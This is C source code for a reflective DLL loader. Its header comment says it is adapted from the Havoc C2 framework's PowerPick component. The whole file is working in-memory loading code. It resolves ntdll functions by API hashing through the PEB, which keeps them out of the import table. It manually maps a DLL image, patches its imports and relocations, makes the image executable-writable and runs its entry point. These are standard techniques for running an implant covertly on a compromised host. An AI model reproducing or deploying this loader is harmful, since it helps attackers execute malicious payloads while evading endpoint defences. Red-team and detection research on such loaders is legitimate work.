/*
 * Minimal KaynLdr-style reflective loader for PowerPickForkHost.
 * Adapted from Havoc PowerPick / Paul Ungur (@C5pider).
 *
 * Entry: KaynLoader(mapName) — runs from the raw DLL bytes in the child,
 * maps a proper image, calls DllMain(hinst, DLL_PROCESS_ATTACH, mapName).
 */
#include "kayn_ldr.h"

#define U_PTR(x) ((ULONG_PTR)(x))
#define C_PTR(x) ((PVOID)(x))

typedef struct {
    WORD offset : 12;
    WORD type : 4;
} IMAGE_RELOC_SHORT, *PIMAGE_RELOC_SHORT;

static PPF_PEB* PpfGetPeb(void)
{
    PPF_PEB* peb;
    __asm__ __volatile__("mov %%gs:0x60, %0" : "=r"(peb));
    return peb;
}

/* Walk back from this function's VA (inside the raw reflective mapping). */
static PVOID KaynCaller(void)
{
    ULONG_PTR probe = (ULONG_PTR)KaynCaller;
    while (1) {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)probe;
        if (dos->e_magic == IMAGE_DOS_SIGNATURE &&
            dos->e_lfanew > 0 && dos->e_lfanew < 0x1000) {
            PIMAGE_NT_HEADERS nt =
                (PIMAGE_NT_HEADERS)(probe + (ULONG)dos->e_lfanew);
            if (nt->Signature == IMAGE_NT_SIGNATURE) {
                return (PVOID)probe;
            }
        }
        probe--;
    }
}

static DWORD KHashString(PVOID string, SIZE_T length)
{
    ULONG hash = HASH_KEY;
    PUCHAR ptr = (PUCHAR)string;

    for (;;) {
        UCHAR character;
        if (!length) {
            if (!*ptr) {
                break;
            }
        } else {
            if ((SIZE_T)(ptr - (PUCHAR)string) >= length) {
                break;
            }
            if (!*ptr) {
                ++ptr;
            }
        }
        character = *ptr;
        if (character >= 'a') {
            character = (UCHAR)(character - 0x20);
        }
        hash = ((hash << 5) + hash) + character;
        ++ptr;
    }
    return hash;
}

static SIZE_T KStringLengthA(LPCSTR string)
{
    LPCSTR p = string;
    while (*p) {
        ++p;
    }
    return (SIZE_T)(p - string);
}

static SIZE_T KStringLengthW(LPCWSTR string)
{
    LPCWSTR p = string;
    while (*p) {
        ++p;
    }
    return (SIZE_T)(p - string);
}

static VOID KCharStringToWCharString(PWCHAR dst, PCHAR src, SIZE_T maxChars)
{
    SIZE_T i;
    for (i = 0; i < maxChars; i++) {
        dst[i] = (WCHAR)(UCHAR)src[i];
        if (src[i] == '\0') {
            return;
        }
    }
    if (maxChars > 0) {
        dst[maxChars - 1] = L'\0';
    }
}

static PVOID KGetModuleByHash(DWORD moduleHash)
{
    PPF_PEB* peb = PpfGetPeb();
    PLIST_ENTRY moduleList;
    PLIST_ENTRY next;

    if (!peb || !peb->Ldr) {
        return NULL;
    }
    moduleList = &peb->Ldr->InLoadOrderModuleList;
    next = moduleList->Flink;
    for (; moduleList != next; next = next->Flink) {
        PPPF_LDR_DATA_TABLE_ENTRY entry = (PPPF_LDR_DATA_TABLE_ENTRY)next;
        if (KHashString(entry->BaseDllName.Buffer, entry->BaseDllName.Length) ==
            moduleHash) {
            return entry->DllBase;
        }
    }
    return NULL;
}

static PVOID KLoadLibrary(KAYNINSTANCE* instance, LPSTR moduleName)
{
    PPF_UNICODE_STRING unicode;
    WCHAR moduleNameW[MAX_PATH];
    DWORD nameSize;
    HMODULE module = NULL;

    if (!moduleName) {
        return NULL;
    }
    nameSize = (DWORD)KStringLengthA(moduleName);
    if (nameSize == 0 || nameSize >= MAX_PATH) {
        return NULL;
    }
    KCharStringToWCharString(moduleNameW, moduleName, nameSize + 1);
    unicode.Length = (USHORT)(KStringLengthW(moduleNameW) * sizeof(WCHAR));
    unicode.MaximumLength = (USHORT)(unicode.Length + sizeof(WCHAR));
    unicode.Buffer = moduleNameW;

    if (NT_SUCCESS(instance->Win32.LdrLoadDll(NULL, 0, &unicode, (PHANDLE)&module))) {
        return module;
    }
    return NULL;
}

static PVOID KGetProcAddressByHash(
    KAYNINSTANCE* instance,
    PVOID dllBase,
    DWORD functionHash)
{
    PIMAGE_NT_HEADERS nt;
    PIMAGE_EXPORT_DIRECTORY exports;
    PDWORD names;
    PDWORD funcs;
    PWORD ords;
    DWORD i;

    (void)instance;
    if (!dllBase) {
        return NULL;
    }
    nt = (PIMAGE_NT_HEADERS)((PUCHAR)dllBase +
        ((PIMAGE_DOS_HEADER)dllBase)->e_lfanew);
    exports = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)dllBase +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
            .VirtualAddress);
    names = (PDWORD)((PUCHAR)dllBase + exports->AddressOfNames);
    funcs = (PDWORD)((PUCHAR)dllBase + exports->AddressOfFunctions);
    ords = (PWORD)((PUCHAR)dllBase + exports->AddressOfNameOrdinals);

    for (i = 0; i < exports->NumberOfNames; i++) {
        PCHAR name = (PCHAR)((PUCHAR)dllBase + names[i]);
        if (KHashString(name, 0) == functionHash) {
            return (PVOID)((PUCHAR)dllBase + funcs[ords[i]]);
        }
    }
    return NULL;
}

static VOID KResolveIAT(KAYNINSTANCE* instance, PVOID kaynImage, PVOID iatDir)
{
    PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)iatDir;

    for (; imp->Name; ++imp) {
        PCHAR importModuleName = (PCHAR)((PUCHAR)kaynImage + imp->Name);
        HMODULE importModule = (HMODULE)KLoadLibrary(instance, importModuleName);
        PIMAGE_THUNK_DATA originalTd =
            (PIMAGE_THUNK_DATA)((PUCHAR)kaynImage +
                (imp->OriginalFirstThunk ? imp->OriginalFirstThunk
                                         : imp->FirstThunk));
        PIMAGE_THUNK_DATA firstTd =
            (PIMAGE_THUNK_DATA)((PUCHAR)kaynImage + imp->FirstThunk);

        if (!importModule) {
            continue;
        }

        for (; originalTd->u1.AddressOfData;
             ++originalTd, ++firstTd) {
            if (IMAGE_SNAP_BY_ORDINAL(originalTd->u1.Ordinal)) {
                /* Host has no ordinal imports; skip. */
                continue;
            } else {
                PIMAGE_IMPORT_BY_NAME byName =
                    (PIMAGE_IMPORT_BY_NAME)((PUCHAR)kaynImage +
                        originalTd->u1.AddressOfData);
                DWORD functionHash =
                    KHashString(byName->Name, KStringLengthA(byName->Name));
                PVOID function =
                    KGetProcAddressByHash(instance, importModule, functionHash);
                if (function) {
                    firstTd->u1.Function = (ULONGLONG)function;
                }
            }
        }
    }
}

static VOID KReAllocSections(PVOID kaynImage, PVOID imageBase, PVOID baseRelocDir)
{
    PIMAGE_BASE_RELOCATION ibr = (PIMAGE_BASE_RELOCATION)baseRelocDir;
    ULONG_PTR offset = U_PTR(kaynImage) - U_PTR(imageBase);

    while (ibr->VirtualAddress) {
        PIMAGE_RELOC_SHORT reloc = (PIMAGE_RELOC_SHORT)(ibr + 1);
        while ((PBYTE)reloc != (PBYTE)ibr + ibr->SizeOfBlock) {
            if (reloc->type == IMAGE_REL_BASED_DIR64) {
                *(ULONG_PTR*)(U_PTR(kaynImage) + ibr->VirtualAddress +
                    reloc->offset) += offset;
            }
            reloc++;
        }
        ibr = (PIMAGE_BASE_RELOCATION)reloc;
    }
}

__declspec(dllexport) void WINAPI KaynLoader(LPVOID lpParameter)
{
    KAYNINSTANCE instance;
    HMODULE kaynLibraryLdr;
    PIMAGE_NT_HEADERS ntHeaders;
    PIMAGE_SECTION_HEADER secHeader;
    LPVOID kVirtualMemory = NULL;
    SIZE_T kMemSize = 0;
    PIMAGE_DATA_DIRECTORY imageDir;
    DWORD i;

    instance.Modules.Ntdll = NULL;
    instance.Win32.LdrLoadDll = NULL;
    instance.Win32.NtAllocateVirtualMemory = NULL;
    instance.Win32.NtProtectVirtualMemory = NULL;

    kaynLibraryLdr = (HMODULE)KaynCaller();
    instance.Modules.Ntdll = KGetModuleByHash(NTDLL_HASH);
    if (!instance.Modules.Ntdll) {
        return;
    }

    instance.Win32.LdrLoadDll = (FN_LdrLoadDll)KGetProcAddressByHash(
        &instance, instance.Modules.Ntdll, SYS_LDRLOADDLL);
    instance.Win32.NtAllocateVirtualMemory =
        (FN_NtAllocateVirtualMemory)KGetProcAddressByHash(
            &instance, instance.Modules.Ntdll, SYS_NTALLOCATEVIRTUALMEMORY);
    instance.Win32.NtProtectVirtualMemory =
        (FN_NtProtectVirtualMemory)KGetProcAddressByHash(
            &instance, instance.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY);
    if (!instance.Win32.LdrLoadDll || !instance.Win32.NtAllocateVirtualMemory ||
        !instance.Win32.NtProtectVirtualMemory) {
        return;
    }

    ntHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)kaynLibraryLdr +
        ((PIMAGE_DOS_HEADER)kaynLibraryLdr)->e_lfanew);
    kMemSize = ntHeaders->OptionalHeader.SizeOfImage;

    if (!NT_SUCCESS(instance.Win32.NtAllocateVirtualMemory(
            NtCurrentProcess(),
            &kVirtualMemory,
            0,
            &kMemSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE))) {
        return;
    }

    /* Headers + sections */
    for (i = 0; i < ntHeaders->OptionalHeader.SizeOfHeaders; i++) {
        ((PUCHAR)kVirtualMemory)[i] = ((PUCHAR)kaynLibraryLdr)[i];
    }

    secHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        DWORD j;
        if (secHeader[i].SizeOfRawData == 0) {
            continue;
        }
        for (j = 0; j < secHeader[i].SizeOfRawData; j++) {
            ((PUCHAR)kVirtualMemory)[secHeader[i].VirtualAddress + j] =
                ((PUCHAR)kaynLibraryLdr)[secHeader[i].PointerToRawData + j];
        }
    }

    imageDir =
        &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (imageDir->VirtualAddress) {
        KResolveIAT(
            &instance,
            kVirtualMemory,
            (PUCHAR)kVirtualMemory + imageDir->VirtualAddress);
    }

    imageDir =
        &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (imageDir->VirtualAddress) {
        KReAllocSections(
            kVirtualMemory,
            (PVOID)(ULONG_PTR)ntHeaders->OptionalHeader.ImageBase,
            (PUCHAR)kVirtualMemory + imageDir->VirtualAddress);
    }

    /* RWX whole image — simple and reliable for MinGW CRT. */
    {
        PVOID base = kVirtualMemory;
        SIZE_T region = ntHeaders->OptionalHeader.SizeOfImage;
        ULONG oldProt = 0;
        instance.Win32.NtProtectVirtualMemory(
            NtCurrentProcess(), &base, &region, PAGE_EXECUTE_READWRITE, &oldProt);
    }

    {
        BOOL(WINAPI * dllMain)(PVOID, DWORD, PVOID) =
            (BOOL(WINAPI*)(PVOID, DWORD, PVOID))(
                (PUCHAR)kVirtualMemory +
                ntHeaders->OptionalHeader.AddressOfEntryPoint);
        dllMain(kVirtualMemory, DLL_PROCESS_ATTACH, lpParameter);
    }
}
